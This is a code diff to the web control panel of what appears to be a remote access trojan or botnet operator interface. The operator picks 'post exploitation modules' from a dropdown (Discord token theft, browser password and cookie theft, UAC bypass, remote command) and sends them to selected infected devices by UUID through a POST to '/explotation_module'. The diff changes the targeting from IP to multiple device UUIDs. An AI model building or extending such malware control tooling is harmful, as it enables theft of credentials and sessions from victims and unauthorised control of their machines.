@@ -210,7 +210,7 @@
 <div id="container">
     <div id="panel">
         <div class="payload-container">
-            <select id="payload-dropdown">
+            <select id="pem-dropdown">
                 <option value="steal-token">Steal Discord Token</option>
                 <option value="steal-password">Steal Browser Passwords</option>
                 <option value="steal-cookie">Get Browser Cookies</option>
@@ -219,8 +219,8 @@
                 <option value="uac-bypass">UAC Bypass</option>
                 <option value="send-command">Send Command</option>
             </select>
-            <p style="display: flex; align-items: center;">Select All <input type="checkbox" class="row-select" id="select-all"></p>
-            <button onclick="sendPayload()">Send Post Exploitation Module</button>
+            <p style="display: flex; align-items: center;">Select All <input type="checkbox" id="select-all"></p>
+            <button onclick="send_pem()">Send Post Exploitation Module</button>
         </div>
     </div>
 
@@ -323,19 +323,32 @@
     
     setInterval(updateDevices, 1000);
 
-    function sendPayload() {
-        dropdown = document.getElementById('payload-dropdown').value
+    function send_pem() {
+        dropdown = document.getElementById('pem-dropdown').value
+        checkboxes = document.querySelectorAll('.row-select');
+    
+        // Create an array to store the IDs of selected rows
+        selectedElements = [];
+
+        // Loop through the checkboxes
+        checkboxes.forEach(checkbox => {
+            // Check if the checkbox is checked
+            if (checkbox.checked) {
+                // Add the row ID to the selectedElements array
+                selectedElements.push(checkbox.dataset.rowId);
+            }
+        });
+
         fetch('/explotation_module', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
-            body: JSON.stringify({ 'explotation_module': dropdown, 'ip': document.getElementById('ip-input').value })
+            body: JSON.stringify({ 'explotation_module': dropdown, 'uuids': selectedElements })
         })
         .then(response => {
             console.log('Response from server:', response);
             updateDevices();
-            document.getElementById('ip-input').value = ""
         })
         .catch(error => {
             console.error('Error sending delete request:', error);
